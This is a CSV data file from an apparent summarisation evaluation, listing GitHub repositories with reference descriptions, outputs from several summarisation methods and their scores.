,id,link,summary,lex_rank,edmunson,lead_cm,prsummarizer,lead_cm score,prsummarizer score
12,137313597,https://api.github.com/repos/p4535992/alfresco-etl-connector,The ETL Connector extension for Alfresco allows mass import of documents in an Alfresco repository by using compatible ETL Tools (for now Talend). It also provides an ETL client library that makes it easy to integrate in any ETL tool.,features works by simple rest http interactions with alfresco content provided as fully compliant acp alfresco content package xml imports to any kind of alfresco content not only file and folder but also custom types or aspects any properties and associations any document tree configure permissions on imported content create vs update modes on document and containers provides import result logs team sponsored by habitat 76 httpwww.habitat76.fr design development marc dutoo open wide sa httpwww.openwide.fr samples testing nicolas feray habitat 76 httpnicolas.feray.free.frblogcat5 management support cedric carbone talend httpwww.talend.com license alfresco server extension gpl etl client library lgpl getting started client side etl tool get a compatible etl tool release talend 3.1 using the talfrescooutput component httpwww.talend.fr serverside alfresco repository get the release compatible with your alfresco server at httpsgithub.comopenwidesialfrescoetlconnectordownloads .,etl connector for alfresco alfresco server extension httpknowledge.openwide.frbinviewmainalfrescoetlconnector copyright c 20082012 open wide sa about etl connector the etl connector extension for alfresco allows to import documents in an alfresco repository by using compatible etl tools for now talend.,etl connector for alfresco alfresco server extension httpknowledge.openwide.frbinviewmainalfrescoetlconnector copyright c 20082012 open wide sa about etl connector the etl connector extension for alfresco allows to,etl connector extension to import documents in an etl tool,0.26054666666666665,0.33666999999999997
13,137207214,https://api.github.com/repos/ahoereth/polystores,Polystores is an abstraction and a collection of clients to interact with cloud storages.,install s3 install gcs install azure storage stores this module includes clients and stores abstraction that can be used to interact with aws s3 azure storage and google cloud storage.,polystores polystores is an abstraction and a collection of clients to interact with cloud storages.,polystores polystores is an abstraction and a collection of clients to interact with cloud storages. install n.b. this module does not include by default the,abstraction and a collection of clients to interact with cloud storages,0.6947366666666666,0.8765200000000001
14,137156333,https://api.github.com/repos/StarNab/ezmigrationbundle,This bundle makes it easy to handle eZPlatform / eZPublish5 content upgrades/migrations,to generate a php migration definition execute php ezpublishconsole kaliopmigrationgenerate mybundle amigrationclass formatphp this will create the following file which you are free to edit ...mybundlemigrations2016xxyyhhmmssamigrationclass.php as you can see in the generated definition the php class to be used for a migration needs to implement a specific interface.,kaliop ezmigration bundle this bundle makes it easy to programmatically deploy changes to ezplatform ezpublish 5 database structure and contents.,kaliop ezmigration bundle this bundle makes it easy to programmatically deploy changes to ezplatform ezpublish 5 database structure and contents. it is inspired by the,bundle bundle to enable deploy changes to ezplatform,0.3835233333333334,0.19999999999999998
15,137021376,https://api.github.com/repos/daleathan/TMG2SQL,A Utility to Convert a The Master Genealogist Database into a SQL/Sqlite Database ,place the directory somewhere and add an entry on your path to it or put the directory somewhere on the path and run with tmg2sqltmg2sql usage program tmg2sql foo.pjc this command will convert the foo.pjc tmg project into a sqlite database by the same name.,tmg2sql a utility to convert a the master genealogist database into a sqlsqlite database this is a small python utility to convert a tmg database into a sqlite database and eventually distribution this repository contains several forms of distribution of this module.,tmg2sql a utility to convert a the master genealogist database into a sqlsqlite database this is a small python utility to convert a tmg database,utility to convert a tmg master genealogist database into a sqlsqlite database and eventually,0.5904333333333334,0.6556799999999999
16,136616173,https://api.github.com/repos/kevinmiles/api-design-guide,Guidelines for designing REST APIs at Cisco,3.13.5 a service should return an http 301 or 307 response with appropriate location header when a request url indicates a version that is not currently deployed for the requested resource.,1 preface several cisco business units have teamed up to create this restful api design guide.,1 preface several cisco business units have teamed up to create this restful api design guide. collectively this includes devnet collaboration and the application platform,[UNK] [UNK] to use and service network services to [UNK],0.14722333333333334,0.0
17,137045805,https://api.github.com/repos/MichaelRumpler/CopyBitmap,Several options to scroll a SKBitmap with benchmarks,the big surprise was that the other methods except the manual copying were all faster than skiacopyup.,i have a big which i need to scroll up and down.,i have a big which i need to scroll up and down. i do this by copying a part of the bitmap to a different,code code to give the best and target source to act and android,0.14272,0.06349333333333333
18,137121607,https://api.github.com/repos/QQ2737499951/crnn.pytorch-1,PyTorch implementation of CRNN to do Image Text Recognition using torch.nn.CTCLoss,this software implements the convolutional recurrent neural network crnn in pytorch in paper an endtoend trainable neural network for imagebased sequence recognition and its application to scene text recognition baoguang shi xiang bai cong yao pami 2017 arxiv what is it this code implements args.arch densenet ctc loss with pretrained model resnet ctc loss mobilenetv2 ctc loss with pretrained model shufflenetv2 ctc loss remark current network architecture only implement .,convolutional recurrent neural network update 20190521 i rewrite this repo base on fairseq refer to my implementation here.,convolutional recurrent neural network update 20190521 i rewrite this repo base on fairseq refer to my implementation here. and the fairseq text recognition is under,repo for suggestion and cooperation in the text recognition,0.14132666666666668,0.1545466666666667
19,137169090,https://api.github.com/repos/liangyali/GeoSpark,A Cluster Computing System for Processing Large-Scale Spatial Data,geospark contains several modules name api spark compatibilitydependency geosparkcore rdd spark 2.x1.x sparkcore geosparksql sqldataframe sparksql 2.1 and later sparkcore sparksql geosparkcore geosparkviz rdd sqldataframe rdd spark 2.x1.x sql spark 2.1 and latersparkcore sparksql geosparkcore geosparksql geosparkzeppelin apache zeppelin spark 2.1 zeppelin 0.8.1sparkcore sparksql geosparkcore geosparksql geosparkviz core geospark spatialrdds and query operators.,stable latest source code geosparktwitter geospark discussion board since jan. 2018 geospark is a cluster computing system for processing largescale spatial data.,stable latest source code geosparktwitter geospark discussion board since jan. 2018 geospark is a cluster computing system for processing largescale spatial data. geospark extends apache,cluster computing system for processing largescale spatial data geospark extends [UNK] spark [UNK],0.4259733333333333,0.5645233333333334
20,136667845,https://api.github.com/repos/Amir22010/supervision-by-registration,Supervision-by-Registration: An Unsupervised Approach to Improve the Precision of Facial Landmark Detectors,an example to train sbr on the unlabeled sequences the parameter is the path to the detector trained in the basic training section.,supervisionbyregistration an unsupervised approach to improve the precision of facial landmark detectors by xuanyi dong shooui yu xinshuo weng shihen wei yi yang yaser sheikh university of technology sydney facebook reality labs introduction we propose a method to find facial landmarks e.g. corner of eyes corner of mouth tip of nose etc more precisely.,supervisionbyregistration an unsupervised approach to improve the precision of facial landmark detectors by xuanyi dong shooui yu xinshuo weng shihen wei yi yang yaser sheikh,an unsupervised approach to improve the precision of facial landmark,0.5733400000000001,0.8282866666666667
21,136574579,https://api.github.com/repos/amirunpri2018/tensorflow-yolov3,Pure tensorflow Implement of YOLOv3 with support to train your own dataset,4.3 filtering with score threshold the output result may contain several rectangles that are false positives or overlap if your input image size of 416 416 3 you will get 52x5226x2613x13x310647 boxes since yolo v3 totally uses 9 anchor boxes.,this repository is forked and modified from here.,this repository is forked and modified from here. part 1. introduction implementation of yolo v3 object detector in tensorflow tfslim. this repository is inspired by,[UNK] segments of a deep convolutional neural segments in tensorflow to [UNK],0.10914000000000001,0.13888999999999999
22,136983536,https://api.github.com/repos/bradselph/Visolate,"Visolate is an application for calculating machining toolpaths (G-code) for manufacturing printed circuit boards (PCBs) by isolation milling. As an outstanding feature, this calculation is done on the computer's screen, using the features of 3D graphics d",however i traumflug early 2012 learned about the workings of visolate only when enhancing from version 2.1.6 to version 3.0 so i very likely missed the parts not needed for these new features.,visolate is an application for calculating machining toolpaths gcode for manufacturing printed circuit boards pcbs by isolation milling.,visolate is an application for calculating machining toolpaths gcode for manufacturing printed circuit boards pcbs by isolation milling. as an outstanding feature this calculation is,application for calculating machining toolpaths gcode gcode for manufacturing printed,0.73656,0.30278999999999995
23,136894763,https://api.github.com/repos/mattbenscho/anki_progress_stats,A plugin for Anki that adds progress stats for learned and matured cards,motivation anki includes a review count graph that plots the total reviews for learning relearning young and mature cards.,anki progress stats this is a plugin for anki that adds the following graphs.,anki progress stats this is a plugin for anki that adds the following graphs. you can find it listed under anki addons here. graphs learned,plugin for [UNK] the total is a plugin for learning the total card learned and [UNK],0.39181,0.37463
24,137460220,https://api.github.com/repos/houcaisa/pandevice,The Device Framework is a mechanism for interacting with Palo Alto Networks devices (including physical and virtualized Next-generation Firewalls and Panorama).  The Device Framework is object oriented and mimics the traditional interaction with the devic,documentation httppandevice.readthedocs.io overview httppaloaltonetworks.github.iopandevice free software isc license pypi travis rtd gitter features object model of firewall and panorama configuration multiple connection methods including panorama as a proxy all operations natively vsysaware support for high availability pairs and retryrecovery during node failure batch userid operations device api exception classification status palo alto networks device framework is considered alpha.,palo alto networks device framework the device framework is a mechanism for interacting with palo alto networks devices including physical and virtualized nextgeneration firewalls and panorama.,palo alto networks device framework the device framework is a mechanism for interacting with palo alto networks devices including physical and virtualized nextgeneration firewalls and,mechanism is a mechanism for interacting with palo alto networks devices,0.6405466666666667,0.41702
25,137043826,https://api.github.com/repos/mbassetti/edition-node-gulp,"The gulp wrapper around patternlab-node core, providing tasks to interact with the core library and move supporting frontend assets.",installing pattern lab node can be used different ways.,pattern lab node gulp edition the gulp wrapper around pattern lab node core the default patternengine and supporting frontend assets.,pattern lab node gulp edition the gulp wrapper around pattern lab node core the default patternengine and supporting frontend assets. packaged components this edition comes,gulp wrapper to use the gulp wrapper wrapper around pattern [UNK],0.41895,0.2625133333333333
26,136885449,https://api.github.com/repos/engmms/SwitchDecor,An app to help you to add frame to your favorite screenshots from Nintendo Switch.,some features pick your screenshots from gallery extract primary colors from your screenshots select the background color to decorate your screenshots save as highres image to your album build to build this app for both ios and android please refer to the flutter doc.,switchdecor an app to help you adding frame to your favorite screenshots from nintendo switch.,switchdecor an app to help you adding frame to your favorite screenshots from nintendo switch. this project is written in flutter supporting both ios and,an app to help you adding frame to your favorite,0.6263133333333334,0.6829000000000001
27,137229198,https://api.github.com/repos/naglak/python-usbtmc,Provides a USBTMC driver for controlling instruments over USB,then create a file etcudevrules.dusbtmc.rules with the following content usbtmc instruments agilent mso7104 subsystemsusb actionadd attrsidvendor0957 attrsidproduct1755 groupusbtmc mode0660 substituting the correct idvendor and idproduct from lsusb.,python usbtmc readme for more information and updates httpalexforencich.comwikienpythonusbtmcstart github repository httpsgithub.compythonivipythonusbtmc google group httpsgroups.google.comdforumpythonivi introduction python usbtmc provides a pure python usbtmc driver for controlling instruments over usb.,python usbtmc readme for more information and updates httpalexforencich.comwikienpythonusbtmcstart github repository httpsgithub.compythonivipythonusbtmc google group httpsgroups.google.comdforumpythonivi introduction python usbtmc provides a pure python usbtmc driver for,pure python usbtmc driver driver for controlling instruments over usb,0.2309866666666667,0.7265199999999999
28,137186288,https://api.github.com/repos/samkzimm/memristor-models-4-all,This project aims to be a collaborative effort to collect under one roof all the memristor models published to date.,this project may be useful for you whether you are trying to simulate other peoples existing models or as a way to start your own model development as these working examples can help get you up to speed quickly.,introduction we do not provide free technical support this project aims to be a collaborative effort to collect under one roof memristor models published to date.,introduction we do not provide free technical support this project aims to be a collaborative effort to collect under one roof memristor models published to,collaborative project can be a collaborative effort to collect under one roof memristor models,0.7362633333333334,0.6580866666666667
29,136814609,https://api.github.com/repos/KevinRansom/fslang-design,"RFCs and docs related to the F# language design process, see https://github.com/fsharp/fslang-suggestions to submit ideas ",language update release trains delivery of language features is via rfcs plus implementations submitted to httpsgithub.commicrosoftvisualfsharp.,f language design rfcs rfcs requests for comments and docs related to the f language design process.,f language design rfcs rfcs requests for comments and docs related to the f language design process. open f language rfcs including candidates for f,rfcs requests requests for comments and docs related to the f language,0.4203233333333333,0.4666666666666666
30,136590881,https://api.github.com/repos/amalbh1999/scipy_proceedings,Tools used to generate the SciPy conference proceedings,create a paper pr once you are ready to submit your paper make a pull request on github.,scipy proceedings this is the repository for submitting to and managing the proceedings for the annual scientific computing with python conference.,scipy proceedings this is the repository for submitting to and managing the proceedings for the annual scientific computing with python conference. this repository is a,the submitting to and managing the proceedings for the annual scientific computing with python conference,0.16161666666666666,0.2029
31,136820855,https://api.github.com/repos/mtylerpreston/property_sales_eda,Collecting and exploring data for predicting sale values of properties.,the study given betterviews roof data and visual scores for approximately 70000 locations from over the last year records of sales after the time such data was generated and property value estimates from the same time that the data was generated one could determine the viability of using this roof data in estimating selling price.,a study on predicting property values betterview is an insurtech company that created a platform for generating and analyzing roofs of properties at costscale that was impossible until recently.,a study on predicting property values betterview is an insurtech company that created a platform for generating and analyzing roofs of properties at costscale that,insurtech company for generating and analyzing roofs of properties at costscale,0.21068,0.25731
32,137025066,https://api.github.com/repos/gurpreetbajwa/rasa-webchat,A chat widget easy to connect to chatbot platforms such as Rasa Core,storage session defines the state to be stored in the session storage.,webchat a simple webchat widget to connect with a chatbot.,webchat a simple webchat widget to connect with a chatbot. forked from reactchatwidget features text messages quick replies images and videos snippet style for links,simple webchat widget to connect with a chatbot forked from reactchatwidget,0.19396,0.28030333333333335
33,136613033,https://api.github.com/repos/AllenBird/eslint,A fully pluggable tool for identifying and reporting on patterns in JavaScript,eslint website configuring rules contributing reporting bugs code of conduct twitter mailing list chat room eslint is a tool for identifying and reporting on patterns found in ecmascriptjavascript code.,eslint website configuring rules contributing reporting bugs code of conduct twitter mailing list chat room eslint is a tool for identifying and reporting on patterns found in ecmascriptjavascript code.,eslint website configuring rules contributing reporting bugs code of conduct twitter mailing list chat room eslint is a tool for identifying and reporting on patterns,[UNK] is a tool for identifying and reporting on patterns found in ecmascriptjavascript code,0.4025733333333334,0.6282066666666667
34,136815044,https://api.github.com/repos/kovalp/qmcpack,"Main repository for QMCPACK, an open-source production level many-body ab initio Quantum Monte Carlo code for computing the electronic structure of atoms, molecules, and solids.",run the deterministic tests under development some tests will fail from the build directory invoke ctest specifying only tests that are deterministic and known to be reliable.,getting and building qmcpack obtain the latest release or development copy from httpwww.qmcpack.org prerequisites c 14 and c99 capable compilers.,getting and building qmcpack obtain the latest release or development copy from httpwww.qmcpack.org prerequisites c 14 and c99 capable compilers. e.g. gcc 5.0 intel 2018,utility with cmake the build system to work with qmcpack and [UNK],0.07142666666666668,0.08546999999999999
35,137129951,https://api.github.com/repos/PatrickUG/xgcm,python package for analyzing general circulation model output data,xgcm general circulation model postprocessing with xarray pypi conda forge build status codecov docs doi license xgcm is a python package for working with the datasets produced by numerical gcms and similar gridded datasets that are amenable to analysis.,xgcm general circulation model postprocessing with xarray pypi conda forge build status codecov docs doi license xgcm is a python package for working with the datasets produced by numerical gcms and similar gridded datasets that are amenable to analysis.,xgcm general circulation model postprocessing with xarray pypi conda forge build status codecov docs doi license xgcm is a python package for working with the,python package for working with the datasets,0.2598033333333333,0.34523666666666664
36,136590199,https://api.github.com/repos/cycle13/training-py,My solutions to programming puzzles,training python i use this repository to data structures algorithms and my solutions to programming puzzles.,training python i use this repository to data structures algorithms and my solutions to programming puzzles.,training python i use this repository to data structures algorithms and my solutions to programming puzzles. data structures strings and arrays dynamic array class test,this repository to data structures algorithms and my solutions to programming,0.31745999999999996,0.47619000000000006
